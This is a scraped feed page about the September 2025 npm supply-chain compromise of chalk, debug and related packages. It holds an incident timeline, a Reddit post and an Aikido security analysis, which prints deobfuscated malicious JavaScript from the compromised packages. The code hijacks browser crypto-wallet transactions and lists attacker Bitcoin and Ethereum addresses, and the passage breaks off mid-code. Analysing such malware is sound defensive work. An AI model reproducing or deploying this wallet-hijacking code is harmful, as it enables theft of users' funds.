amount</li> </ul><p>There&rsquo;s a Solana codepath as well, which changes various fields to <code>19111111111111111111111111111111</code>, but it&rsquo;s unclear to me whether that would do anything successfully.</p><a href="https://fasterthanli.me#current-situation"><h2>Current situation</h2></a><p><strong>Sep 8, 17:19 UTC</strong></p><p>NPM has contacted Josh and told him they are working to the remove the packages.</p><p>See <a href="https://github.com/debug-js/debug/issues/1005#issuecomment-3266868187">Josh&rsquo;s timestamped comment</a></p><p><strong>Sep 8, 17:11 UTC</strong></p><ul><li>John is still locked out of his npm account</li> <li><a href="https://github.com/chalk/chalk/issues/656">chalk was patched by Sindre</a></li> <li><a href="https://www.npmjs.com/package/simple-swizzle">simple-swizzle is still compromised</a></li> </ul> <figure><picture><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~3c7585127c3ce6fa.w400.jxl 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~354d0fdd43f337cb.w800.jxl 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~09e22de4ef77c1bc.w900.jxl 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~9d8366d50ab5815a.w1800.jxl 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~49b5414e0a55102d.jxl 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~49b5414e0a55102d.jxl 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~89c28cdef0558ca9.w400.avif 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~cf1921a9063b9b4b.w800.avif 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~3f899e43824b206d.w900.avif 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~cbd731cd984b670a.w1800.avif 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~ec3707dfa15312d8.avif 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~ec3707dfa15312d8.avif 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~5d348df9d95a4693.w400.webp 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~48f7a9b55c9dede1.w800.webp 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~851cbfd8a8f4b386.w900.webp 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~560df4965948f68a.w1800.webp 2x"><source srcset="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~038fd6b0756a82ef.webp 1x,https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~038fd6b0756a82ef.webp 2x"><img src="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/simple-swizzle@2x~49b5414e0a55102d.jxl" width="1204" height="675" title="see the obfuscated code starting with const _0x112fa8 " alt="Screenshot of npm showing simple-swizzle source code "></source></source></source></source></source></source></source></source></source></picture><figcaption><p>see the obfuscated code starting with const _0x112fa8</p><cite><a href="https://www.npmjs.com/package/simple-swizzle?activeTab=code%20">npm page for simple-swizzle, code tab </a></cite></figcaption> </figure><p>The npm team seems rather unresponsive given the urgency of the situation:</p><blockquote><p>It&rsquo;s been almost two hours without a single email back from npm. I am sitting here struggling to figure out what to do to fix any of this. The packages that have Sindre as a co-publisher have been published over but even he isn&rsquo;t able to yank the malicious versions AFAIU. If there&rsquo;s any ideas on what I should be doing, I&rsquo;m all ears.</p><p><a href="https://news.ycombinator.com/item?id=45170687">HN comment</a></p></blockquote><p>The best place to stay informed is probably <a href="https://cyberplace.social/@GossiTheDog/115169390397282254">Kevin&rsquo;s thread</a> on Mastodon.</p><p>(JavaScript is required to see this. Or maybe my stuff broke) </p><div><p>Here's another article just for you: </p></div></div><div class="gallery"><p><img src="https://cdn.fasterthanli.me/content/articles/color-npm-package-compromised/color-weekly-downloads@2x~5fb8d8f9274b135b.jxl"></p></div></section>]]></description><pubDate>Mon, 08 Sep 2025 23:42:26 +0530</pubDate></item><item><link>https://www.aikido.dev/blog/npm-debug-and-chalk-packages-compromised</link><title>Largest NPM Compromise in History - Supply Chain Attack (aikido.dev)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nbqt4d/largest_npm_compromise_in_history_supply_chain/</guid><comments>https://www.reddit.com/r/programming/comments/1nbqt4d/largest_npm_compromise_in_history_supply_chain/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 83 min | <a href='https://www.reddit.com/r/programming/comments/1nbqt4d/largest_npm_compromise_in_history_supply_chain/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>Hey Everyone</p><p>We just discovered that around 1 hour ago packages with a total of 2 billion weekly downloads on npm were compromised all belonging to one developer <a href="https://www.npmjs.com/%7Eqix">https://www.npmjs.com/~qix</a></p><p>ansi-styles (371.41m downloads per week)<br/>debug (357.6m downloads per week)<br/>backslash (0.26m downloads per week)<br/>chalk-template (3.9m downloads per week)<br/>supports-hyperlinks (19.2m downloads per week)<br/>has-ansi (12.1m downloads per week)<br/>simple-swizzle (26.26m downloads per week)<br/>color-string (27.48m downloads per week)<br/>error-ex (47.17m downloads per week)<br/>color-name (191.71m downloads per week)<br/>is-arrayish (73.8m downloads per week)<br/>slice-ansi (59.8m downloads per week)<br/>color-convert (193.5m downloads per week)<br/>wrap-ansi (197.99m downloads per week)<br/>ansi-regex (243.64m downloads per week)<br/>supports-color (287.1m downloads per week)<br/>strip-ansi (261.17m downloads per week)<br/>chalk (299.99m downloads per week)</p><p>The compromises all stem from a core developers NPM account getting taken over from a phishing campaign</p><p>The malware itself, luckily, looks like its mostly intrested in crypto at the moment so its impact is smaller than if they had installed a backdoor for example.</p><h1>How the Malware Works (Step by Step)</h1><ol><li><strong>Injects itself into the browser</strong><ul><li>Hooks core functions like <code>fetch</code>, <code>XMLHttpRequest</code>, and wallet APIs (<code>window.ethereum</code>, Solana, etc.).</li><li>Ensures it can intercept both web traffic and wallet activity.</li></ul></li><li><strong>Watches for sensitive data</strong><ul><li>Scans network responses and transaction payloads for anything that looks like a wallet address or transfer.</li><li>Recognizes multiple formats across Ethereum, Bitcoin, Solana, Tron, Litecoin, and Bitcoin Cash.</li></ul></li><li><strong>Rewrites the targets</strong><ul><li>Replaces the legitimate destination with an attacker-controlled address.</li><li>Uses “lookalike” addresses (via string-matching) to make swaps less obvious.</li></ul></li><li><strong>Hijacks transactions before they’re signed</strong><ul><li>Alters Ethereum and Solana transaction parameters (e.g., recipients, approvals, allowances).</li><li>Even if the UI looks correct, the signed transaction routes funds to the attacker.</li></ul></li><li><strong>Stays stealthy</strong><ul><li>If a crypto wallet is detected, it avoids obvious swaps in the UI to reduce suspicion.</li><li>Keeps silent hooks running in the background to capture and alter real transactions</li></ul></li></ol><p>Our blog is being dynamically updated - <a href="https://www.aikido.dev/blog/npm-debug-and-chalk-packages-compromised">https://www.aikido.dev/blog/npm-debug-and-chalk-packages-compromised</a></p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://cdn.prod.website-files.com/642adcaf364024654c71df23/68beea4577bd0a48abb147d9_nx-compromise%20(2).png' /></section><section class='parsed-content'><div><div><div><div><p>Published on:</p><p>September 8, 2025</p></div><div><p>Last updated on:</p><p>September 8, 2025</p></div></div><div><p>Starting at September 8th, 13:16 UTC, our Aikido intel feed alerted us to a series packages being pushed to npm, which appeared to contains malicious code. These were 18 very popular packages,</p><ul><li>backslash (0.26m downloads per week)</li><li>chalk-template (3.9m downloads per week)</li><li>supports-hyperlinks (19.2m downloads per week)</li><li>has-ansi (12.1m downloads per week)</li><li>simple-swizzle (26.26m downloads per week)</li><li>color-string (27.48m downloads per week)</li><li>error-ex (47.17m downloads per week)</li><li>color-name (191.71m downloads per week)</li><li>is-arrayish (73.8m downloads per week)</li><li>slice-ansi (59.8m downloads per week)</li><li>color-convert (193.5m downloads per week)</li><li>wrap-ansi (197.99m downloads per week)</li><li>ansi-regex (243.64m downloads per week)</li><li>supports-color (287.1m downloads per week)</li><li>strip-ansi (261.17m downloads per week)</li><li>chalk (299.99m downloads per week)</li><li>debug (357.6m downloads per week)</li><li>ansi-styles (371.41m downloads per week)</li></ul><p>All together, these packages have more than 2 billion downloads per week. </p><p>The packages were updated to contain a piece of code that would be executed on the client of a website, which silently intercepts crypto and web3 activity in the browser, manipulates wallet interactions, and rewrites payment destinations so that funds and approvals are redirected to attacker-controlled accounts without any obvious signs to the user.</p><p>To avoid being compromised by packages like this, check out Aikido <a href="https://www.aikido.dev/blog/introducing-safe-chain">safe-chain</a>!</p><h2>What happened?</h2><p>The above packages all started having new versions released, an example here being is-arrayish:</p><figure></figure><p>We can see that the index.js file is modified, and contains obfuscated code:</p><figure></figure><p>&zwj;</p><p>After applying a bit of deobfuscation to it, we get a fairly complex piece of code still:</p><pre><code><span>var</span><span> neth = </span><span>; </span><span>var</span><span> rund = </span><span>; </span><span>var</span><span> loval = </span><span>; </span><span>async</span><span>function</span><span>checkethereumw</span><span>(</span><span>) </span><span>{ </span><span>try</span><span> { </span><span>const</span><span> _0x124ed3 = </span><span>await</span><span>window</span><span>.ethereum.request({ </span><span>'method'</span><span>: </span><span>"eth_accounts"</span> }); <span> </span><span>if</span><span> (_0x124ed3.length &gt; </span><span>) { </span> runmask(); <span>if</span><span> (rund != </span><span>1</span><span>) { </span><span> rund = </span><span>1</span><span>; </span><span> neth = </span><span>1</span><span>; </span> newdlocal(); } <span> } </span><span>else</span><span>if</span><span> (rund != </span><span>1</span><span>) { </span><span> rund = </span><span>1</span><span>; </span> newdlocal(); } <span> } </span><span>catch</span><span> (_0x53a897) { </span><span>if</span><span> (rund != </span><span>1</span><span>) { </span><span> rund = </span><span>1</span><span>; </span> newdlocal(); } } } <span>if</span><span> (</span><span>typeof</span><span>window</span><span> != </span><span>"undefined"</span><span> &amp;&amp; </span><span>typeof</span><span>window</span><span>.ethereum != </span><span>"undefined"</span><span>) { </span> checkethereumw(); <span>} </span><span>else</span><span>if</span><span> (rund != </span><span>1</span><span>) { </span><span> rund = </span><span>1</span><span>; </span> newdlocal(); } <span>function</span><span>newdlocal</span><span>(</span><span>) </span><span>{ </span><span>const</span><span> _0xba16ef = { </span><span>'zprkq'</span><span>: </span><span>function</span><span> (</span><span>_0x23e86b, _0x5b593c</span><span>) </span><span>{ </span><span>return</span><span> _0x23e86b + _0x5b593c; </span> }, <span>'iJAYR'</span><span>: </span><span>function</span><span> (</span><span>_0xc91263, _0x20ad3a</span><span>) </span><span>{ </span><span>return</span><span> _0xc91263 &lt;= _0x20ad3a; </span> }, <span>'nqxhl'</span><span>: </span><span>function</span><span> (</span><span>_0x31d70d, _0x545869</span><span>) </span><span>{ </span><span>return</span><span> _0x31d70d &lt;= _0x545869; </span> }, <span>'myaXd'</span><span>: </span><span>function</span><span> (</span><span>_0xd587f7, _0x356cb8</span><span>) </span><span>{ </span><span>return</span><span> _0xd587f7 === _0x356cb8; </span> }, <span>'IptyQ'</span><span>: </span><span>function</span><span> (</span><span>_0x52d73c, _0x1701dc</span><span>) </span><span>{ </span><span>return</span><span> _0x52d73c - _0x1701dc; </span> }, <span>'QCTBQ'</span><span>: </span><span>function</span><span> (</span><span>_0x3b97a6, _0x5cd5e9</span><span>) </span><span>{ </span><span>return</span><span> _0x3b97a6 - _0x5cd5e9; </span> }, <span>'avmeH'</span><span>: </span><span>function</span><span> (</span><span>_0x370f68, _0x51151b</span><span>) </span><span>{ </span><span>return</span><span> _0x370f68 - _0x51151b; </span> }, <span>'TwyPu'</span><span>: </span><span>function</span><span> (</span><span>_0x43ced5, _0x54174b</span><span>) </span><span>{ </span><span>return</span><span> _0x43ced5 + _0x54174b; </span> }, <span>'arczN'</span><span>: </span><span>function</span><span> (</span><span>_0x2b592d, _0x5339ba</span><span>) </span><span>{ </span><span>return</span><span> _0x2b592d - _0x5339ba; </span> }, <span>'yMgZR'</span><span>: </span><span>function</span><span> (</span><span>_0xb3fb8a, _0x24a479</span><span>) </span><span>{ </span><span>return</span><span> _0xb3fb8a - _0x24a479; </span> }, <span>'qEVKr'</span><span>: </span><span>function</span><span> (</span><span>_0x4a3a26, _0x16853b</span><span>) </span><span>{ </span><span>return</span><span> _0x4a3a26 - _0x16853b; </span> }, <span>'vGpiX'</span><span>: </span><span>function</span><span> (</span><span>_0x9c66ab, _0x1a38b9, _0x1d740b</span><span>) </span><span>{ </span><span>return</span><span> _0x9c66ab(_0x1a38b9, _0x1d740b); </span> }, <span>'eGWOd'</span><span>: </span><span>function</span><span> (</span><span>_0x3630fa, _0x17694b</span><span>) </span><span>{ </span><span>return</span><span> _0x3630fa &lt; _0x17694b; </span> }, <span>'tfqRA'</span><span>: </span><span>function</span><span> (</span><span>_0x562199, ..._0x1555b8</span><span>) </span><span>{ </span><span>return</span><span> _0x562199(..._0x1555b8); </span> }, <span>'viQtk'</span><span>: </span><span>"Content-Type"</span><span>, </span><span>'DSXar'</span><span>: </span><span>"application/json"</span><span>, </span><span>'mDaWt'</span><span>: </span><span>function</span><span> (</span><span>_0x2116fd, _0x26f622</span><span>) </span><span>{ </span><span>return</span><span> _0x2116fd(_0x26f622); </span> }, <span>'FXtyf'</span><span>: </span><span>function</span><span> (</span><span>_0x4f1346, _0x53343b</span><span>) </span><span>{ </span><span>return</span><span> _0x4f1346 === _0x53343b; </span> }, <span>'FYAPh'</span><span>: </span><span>"string"</span><span>, </span><span>'UmfJm'</span><span>: </span><span>function</span><span> (</span><span>_0x301d56, _0x29139b</span><span>) </span><span>{ </span><span>return</span><span> _0x301d56 === _0x29139b; </span> }, <span>'LmXxC'</span><span>: </span><span>function</span><span> (</span><span>_0x467473, _0x5d7154</span><span>) </span><span>{ </span><span>return</span><span> _0x467473(_0x5d7154); </span> }, <span>'yVHgJ'</span><span>: </span><span>"responseText"</span><span>, </span><span>'aXpuC'</span><span>: </span><span>"response"</span><span>, </span><span>'yArwb'</span><span>: </span><span>"object"</span><span>, </span><span>'MJKcn'</span><span>: </span><span>function</span><span> (</span><span>_0x5561bf, _0x1792e6</span><span>) </span><span>{ </span><span>return</span><span> _0x5561bf !== _0x1792e6; </span> }, <span>'gHrJP'</span><span>: </span><span>function</span><span> (</span><span>_0xe2c323, _0x4c49d0</span><span>) </span><span>{ </span><span>return</span><span> _0xe2c323 === _0x4c49d0; </span> }, <span>'OiGzk'</span><span>: </span><span>"1H13VnQJKtT4HjD5ZFKaaiZEetMbG7nDHx"</span><span>, </span><span>'EAhsy'</span><span>: </span><span>"1Li1CRPwjovnGHGPTtcKzy75j37K6n97Rd"</span><span>, </span><span>'lLQUz'</span><span>: </span><span>"1Dk12ey2hKWJctU3V8Akc1oZPo1ndjbnjP"</span><span>, </span><span>'ibPEr'</span><span>: </span><span>"1NBvJqc1GdSb5uuX8vT7sysxtT4LB8GnuY"</span><span>, </span><span>'cGpnb'</span><span>: </span><span>"1Mtv6GsFsbno9XgSGuG6jRXyBYv2tgVhMj"</span><span>, </span><span>'wAGlT'</span><span>: </span><span>"1BBAQm4DL78JtRdJGEfzDBT2PBkGyvzf4N"</span><span>, </span><span>'Hauzr'</span><span>: </span><span>"1KkovSeka94yC5K4fDbfbvZeTFoorPggKW"</span><span>, </span><span>'nJNgC'</span><span>: </span><span>"18CPyFLMdncoYccmsZPnJ5T1hxFjh6aaiV"</span><span>, </span><span>'EHOlV'</span><span>: </span><span>"1BijzJvYU2GaBCYHa8Hf3PnJh6mjEd92UP"</span><span>, </span><span>'cOZYT'</span><span>: </span><span>"1Bjvx6WXt9iFB5XKAVsU3TgktgeNbzpn5N"</span><span>, </span><span>'cIySf'</span><span>: </span><span>"19fUECa9aZCQxcLeo8FZu8kh5kVWheVrg8"</span><span>, </span><span>'rrGeC'</span><span>: </span><span>"1DZEep7GsnmBVkbZR3ogeBQqwngo6x4XyR"</span><span>, </span><span>'geUVS'</span><span>: </span><span>"1GX1FWYttd65J26JULr9HLr98K7VVUE38w"</span><span>, </span><span>'TZdxq'</span><span>: </span><span>"14mzwvmF2mUd6ww1gtanQm8Bxv3ZWmxDiC"</span><span>, </span><span>'JgcFw'</span><span>: </span><span>"1EYHCtXyKMMhUiJxXJH4arfpErNto5j87k"</span><span>, </span><span>'gKbQq'</span><span>: </span><span>"19D1QXVQCoCLUHUrzQ4rTumqs9jBcvXiRg"</span><span>, </span><span>'KObJu'</span><span>: </span><span>"16mKiSoZNTDaYLBQ5LkunK6neZFVV14b7X"</span><span>, </span><span>'vYGdx'</span><span>: </span><span>"18x8S4yhFmmLUpZUZa3oSRbAeg8cpECpne"</span><span>, </span><span>'gtZOV'</span><span>: </span><span>"1EkdNoZJuXTqBeaFVzGwp3zHuRURJFvCV8"</span><span>, </span><span>'ApfqP'</span><span>: </span><span>"13oBVyPUrwbmTAbwxVDMT9i6aVUgm5AnKM"</span><span>, </span><span>'hgmsX'</span><span>: </span><span>"1DwsWaXLdsn4pnoMtbsmzbH7rTj5jNH6qS"</span><span>, </span><span>'TNgNB'</span><span>: </span><span>"13wuEH28SjgBatNppqgoUMTWwuuBi9e4tJ"</span><span>, </span><span>'UhmAX'</span><span>: </span><span>"154jc6v7YwozhFMppkgSg3BdgpaFPtCqYn"</span><span>, </span><span>'vXyJx'</span><span>: </span><span>"1AP8zLJE6nmNdkfrf1piRqTjpasw7vk5rb"</span><span>, </span><span>'HmJHn'</span><span>: </span><span>"19F8YKkU7z5ZDAypxQ458iRqH2ctGJFVCn"</span><span>, </span><span>'UlhFZ'</span><span>: </span><span>"17J3wL1SapdZpT2ZVX72Jm5oMSXUgzSwKS"</span><span>, </span><span>'VShzV'</span><span>: </span><span>"16z8D7y3fbJsWFs3U8RvBF3A8HLycCW5fH"</span><span>, </span><span>'IzSNV'</span><span>: </span><span>"1PYtCvLCmnGDNSVK2gFE37FNSf69W2wKjP"</span><span>, </span><span>'hiXcO'</span><span>: </span><span>"143wdqy6wgY3ez8Nm19AqyYh25AZHz3FUp"</span><span>, </span><span>'gwsfo'</span><span>: </span><span>"1JuYymZbeoDeH5q65KZVG3nBhYoTK9YXjm"</span><span>, </span><span>'XjToi'</span><span>: </span><span>"1PNM2L1bpJQWipuAhNuB7BZbaFLB3LCuju"</span><span>, </span><span>'qzLJJ'</span><span>: </span><span>"19onjpqdUsssaFKJjwuAQGi2eS41vE19oi"</span><span>, </span><span>'NrttU'</span><span>: </span><span>"1JQ15RHehtdnLAzMcVT9kU8qq868xFEUsS"</span><span>, </span><span>'mLamd'</span><span>: </span><span>"1LVpMCURyEUdE8VfsGqhMvUYVrLzbkqYwf"</span><span>, </span><span>'ENfnx'</span><span>: </span><span>"1KMcDbd2wecP4Acoz9PiZXsBrJXHbyPyG6"</span><span>, </span><span>'teGcp'</span><span>: </span><span>"1DZiXKhBFiKa1f6PTGCNMKSU1xoW3Edb7Z"</span><span>, </span><span>'lkQtS'</span><span>: </span><span>"174bEk62kr8dNgiduwHgVzeLgLQ38foEgZ"</span><span>, </span><span>'nVfSu'</span><span>: </span><span>"17cvmxcjTPSBsF1Wi2HfcGXnpLBSzbAs6p"</span><span>, </span><span>'XdmQg'</span><span>: </span><span>"1NoYvnedUqNshKPZvSayfk8YTQYvoB2wBc"</span><span>, </span><span>'hTAuL'</span><span>: </span><span>"13694eCkAtBRkip8XdPQ8ga99KEzyRnU6a"</span><span>, </span><span>'hmVdI'</span><span>: </span><span>"bc1qms4f8ys8c4z47h0q29nnmyekc9r74u5ypqw6wm"</span><span>, </span><span>'SvssU'</span><span>: </span><span>"bc1qznntn2q7df8ltvx842upkd9uj4atwxpk0whxh9"</span><span>, </span><span>'zXlNj'</span><span>: </span><span>"bc1q4rllc9q0mxs827u6vts2wjvvmel0577tdsvltx"</span><span>, </span><span>'OOAQz'</span><span>: </span><span>"bc1qj8zru33ngjxmugs4sxjupvd9cyh84ja0wjx9c4"</span><span>, </span><span>'TDfnH'</span><span>: </span><span>"bc1qc972tp3hthdcufsp9ww38yyer390sdc9cvj8ar"</span><span>, </span><span>'UrAmA'</span><span>: </span><span>"bc1qw0z864re8yvrjqmcw5fs6ysndta2avams0c6nh"</span><span>, </span><span>'ELPqV'</span><span>: </span><span>"bc1qzdd8c7g2g9mnnxy635ndntem2827ycxxyn3v4h"</span><span>, </span><span>'xlnbk'</span><span>: </span><span>"bc1qaavgpwm98n0vtaeua539gfzgxlygs8jpsa0mmt"</span><span>, </span><span>'aApMn'</span><span>: </span><span>"bc1qrdlkyhcrx4n2ksfjfh78xnqrefvsr34nf2u0sx"</span><span>, </span><span>'Pvsjl'</span><span>: </span><span>"bc1q9ytsyre66yz56x3gufhqks7gqd8sa8uk4tv5fh"</span><span>, </span><span>'fmvYL'</span><span>: </span><span>"bc1qfrvsj2dkey2dg8ana0knczzplcqr7cgs9s52vq"</span><span>, </span><span>'fXywx'</span><span>: </span><span>"bc1qg7lkw04hg5yggh28ma0zvtkeg95k0yefqmvv2f"</span><span>, </span><span>'RRxbR'</span><span>: </span><span>"bc1qmeplum3jy2vrlyzw4vhrcgeama35tr9kw8yfrn"</span><span>, </span><span>'VrdPL'</span><span>: </span><span>"bc1qamqx0h8rxfcs4l56egrpau4ryqu4r642ttmxq4"</span><span>, </span><span>'qSKMT'</span><span>: </span><span>"bc1qsaxgtck26mgecgfvp9ml4y5ljyl8ylpdglqz30"</span><span>, </span><span>'mbTQq'</span><span>: </span><span>"bc1qsz90ulta8dx5k8xzzjqruzahav2vxchtk2l8v7"</span><span>, </span><span>'xHmCb'</span><span>: </span><span>"bc1q3ad2zyc5mpc9nnzmmtxqpu467jeh4m928r7qf4"</span><span>, </span><span>'OqeMw'</span><span>: </span><span>"bc1qlrdqrulwmvfg86rmp77k8npdefns52ykk8cxs6"</span><span>, </span><span>'BNnlw'</span><span>: </span><span>"bc1q5hqxk5ugvf2d3y6qj2a7cy7u79ckusu9eknpsr"</span><span>, </span><span>'FkDWd'</span><span>: </span><span>"bc1qszm3nugttmtpkq77dhphtqg4u7vuhxxcrh7f79"</span><span>, </span><span>'aBdRe'</span><span>: </span><span>"bc1qqc09xnyafq0y4af3x7j5998tglxcanjuzy974m"</span><span>, </span><span>'roief'</span><span>: </span><span>"bc1qqqh29zxfzxk0fvmq9d7hwedh5yz44zhf7e23qz"</span><span>, </span><span>'qMxmV'</span><span>: </span><span>"bc1qsg57tpvfj6gysrw5w4sxf3dweju40g87uuclvu"</span><span>, </span><span>'kkYGi'</span><span>: </span><span>"bc1qje95nehs8y0wvusp2czr25p7kghk6j3cvgugy5"</span><span>, </span><span>'zbnSH'</span><span>: </span><span>"bc1qwrnchp96p38u8ukp8jc8cq22q35n3ajfav0pzf"</span><span>, </span><span>'dHxYm'</span><span>: </span><span>"bc1q6l99s704jccclxx5rc2x2c5shlgs2pg0fpnflk"</span><span>, </span><span>'OfXMz'</span><span>: </span><span>"bc1qeuk2u6xl4rgfq0x9yc37lw49kutnd8gdlxt9st"</span><span>, </span><span>'OZznV'</span><span>: </span><span>"bc1qxul8lwxvt7lt9xuge0r2jls7evrwyyvcf2ah0u"</span><span>, </span><span>'NHzcN'</span><span>: </span><span>"bc1qcplvxyzs9w09g6lpglj6xxdfxztfwjsgz95czd"</span><span>, </span><span>'sxqWF'</span><span>: </span><span>"bc1q9ca9ae2cjd3stmr9lc6y527s0x6vvqys6du00u"</span><span>, </span><span>'oIQra'</span><span>: </span><span>"bc1qmap3cqss3t4vetg8z9s995uy62jggyxjk29jkp"</span><span>, </span><span>'qIAwe'</span><span>: </span><span>"bc1qg3c6c7y5xeqkxnjsx9ymclslr2sncjrxjylkej"</span><span>, </span><span>'IneJW'</span><span>: </span><span>"bc1q9zx63qdjwldxp4s9egeqjelu3y5yqsajku8m29"</span><span>, </span><span>'tjIgE'</span><span>: </span><span>"bc1ql2awtv7nzcp2dqce3kny2ra3dz946c9vg2yukq"</span><span>, </span><span>'vuJMD'</span><span>: </span><span>"bc1qhytpe64tsrrvgwm834q35w6607jc6azqtnvl2a"</span><span>, </span><span>'Uxzul'</span><span>: </span><span>"bc1q4rlgfgjwg9g2pqwqkf5j9hq6ekn39rjmzv09my"</span><span>, </span><span>'MoAYB'</span><span>: </span><span>"bc1q28ks0u6fhvv7hktsavnfpmu59anastfj5sq8dw"</span><span>, </span><span>'wKaGs'</span><span>: </span><span>"bc1qjqfpxvl2j2hzx2cxeqhchrh02dcjy3z5k6gv55"</span><span>, </span><span>'VmOdy'</span><span>: </span><span>"bc1q8zznzs9z93xpkpunrmeqp6fg54s3q7dkh9z9xw"</span><span>, </span><span>'YcvKY'</span><span>: </span><span>"bc1qt4c4e6xwt5dz4p629ndz9zmeep2kmvqgy53037"</span><span>, </span><span>'FlhWy'</span><span>: </span><span>"0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>, </span><span>'sCKdW'</span><span>: </span><span>"0xa29eeFb3f21Dc8FA8bce065Db4f4354AA683c024"</span><span>, </span><span>'ZAiba'</span><span>: </span><span>"0x40C351B989113646bc4e9Dfe66AE66D24fE6Da7B"</span><span>, </span><span>'AsHKD'</span><span>: </span><span>"0x30F895a2C66030795131FB66CBaD6a1f91461731"</span><span>, </span><span>'rzrhZ'</span><span>: </span><span>"0x57394449fE8Ee266Ead880D5588E43501cb84cC7"</span><span>, </span><span>'expPy'</span><span>: </span><span>"0xCd422cCC9f6e8f30FfD6F68C0710D3a7F24a026A"</span><span>, </span><span>'zlBwY'</span><span>: </span><span>"0x7C502F253124A88Bbb6a0Ad79D9BeD279d86E8f4"</span><span>, </span><span>'nElAL'</span><span>: </span><span>"0xe86749d6728d8b02c1eaF12383c686A8544de26A"</span><span>, </span><span>'wqRjK'</span><span>: </span><span>"0xa4134741a64F882c751110D3E207C51d38f6c756"</span><span>, </span><span>'HcYDT'</span><span>: </span><span>"0xD4A340CeBe238F148034Bbc14478af59b1323d67"</span><span>, </span><span>'BqNRF'</span><span>: </span><span>"0xB00A433e1A5Fc40D825676e713E5E351416e6C26"</span><span>, </span><span>'OvURa'</span><span>: </span><span>"0xd9Df4e4659B1321259182191B683acc86c577b0f"</span><span>, </span><span>'PFfEj'</span><span>: </span><span>"0x0a765FA154202E2105D7e37946caBB7C2475c76a"</span><span>, </span><span>'IOjJb'</span><span>: </span><span>"0xE291a6A58259f660E8965C2f0938097030Bf1767"</span><span>, </span><span>'uKfqV'</span><span>: </span><span>"0xe46e68f7856B26af1F9Ba941Bc9cd06F295eb06D"</span><span>, </span><span>'DAJYA'</span><span>: </span><span>"0xa7eec0c4911ff75AEd179c81258a348c40a36e53"</span><span>, </span><span>'SUVoY'</span><span>: </span><span>"0x3c6762469ea04c9586907F155A35f648572A0C3E"</span><span>, </span><span>'WJmWS'</span><span>: </span><span>"0x322FE72E1Eb64F6d16E6FCd3d45a376efD4bC6b2"</span><span>, </span><span>'QBAXK'</span><span>: </span><span>"0x51Bb31a441531d34210a4B35114D8EF3E57aB727"</span><span>, </span><span>'zLNIR'</span><span>: </span><span>"0x314d5070DB6940C8dedf1da4c03501a3AcEE21E1"</span><span>, </span><span>'kTQGi'</span><span>: </span><span>"0x75023D76D6cBf88ACeAA83447C466A9bBB0c5966"</span><span>, </span><span>'XJxSR'</span><span>: </span><span>"0x1914F36c62b381856D1F9Dc524f1B167e0798e5E"</span><span>, </span><span>'kHjMo'</span><span>: </span><span>"0xB9e9cfd931647192036197881A9082cD2D83589C"</span><span>, </span><span>'kxPDg'</span><span>: </span><span>"0xE88ae1ae3947B6646e2c0b181da75CE3601287A4"</span><span>, </span><span>'gWISZ'</span><span>: </span><span>"0x0D83F2770B5bDC0ccd9F09728B3eBF195cf890e2"</span><span>, </span><span>'hIHlD'</span><span>: </span><span>"0xe2D5C35bf44881E37d7183DA2143Ee5A84Cd4c68"</span><span>, </span><span>'QgItq'</span><span>: </span><span>"0xd21E6Dd2Ef006FFAe9Be8d8b0cdf7a667B30806d"</span><span>, </span><span>'bLJZU'</span><span>: </span><span>"0x93Ff376B931B92aF91241aAf257d708B62D62F4C"</span><span>, </span><span>'IdVSI'</span><span>: </span><span>"0x5C068df7139aD2Dedb840ceC95C384F25b443275"</span><span>, </span><span>'Rpwne'</span><span>: </span><span>"0x70D24a9989D17a537C36f2FB6d8198CC26c1c277"</span><span>, </span><span>'NYUBp'</span><span>: </span><span>"0x0ae487200606DEfdbCEF1A50C003604a36C68E64"</span><span>, </span><span>'eQrXq'</span><span>: </span><span>"0xc5588A6DEC3889AAD85b9673621a71fFcf7E6B56"</span><span>, </span><span>'yRdVI'</span><span>: </span><span>"0x3c23bA2Db94E6aE11DBf9cD2DA5297A09d7EC673"</span><span>, </span><span>'IDnjA'</span><span>: </span><span>"0x5B5cA7d3089D3B3C6393C0B79cDF371Ec93a3fd3"</span><span>, </span><span>'ajXoV'</span><span>: </span><span>"0x4Cb4c0E7057829c378Eb7A9b174B004873b9D769"</span><span>, </span><span>'xyHoE'</span><span>: </span><span>"0xd299f05D1504D0B98B1D6D3c282412FD4Df96109"</span><span>, </span><span>'TCqKY'</span><span>: </span><span>"0x241689F750fCE4A974C953adBECe0673Dc4956E0"</span><span>, </span><span>'dQfUy'</span><span>: </span><span>"0xBc5f75053Ae3a8F2B9CF9495845038554dDFb261"</span><span>, </span><span>'ctRhh'</span><span>: 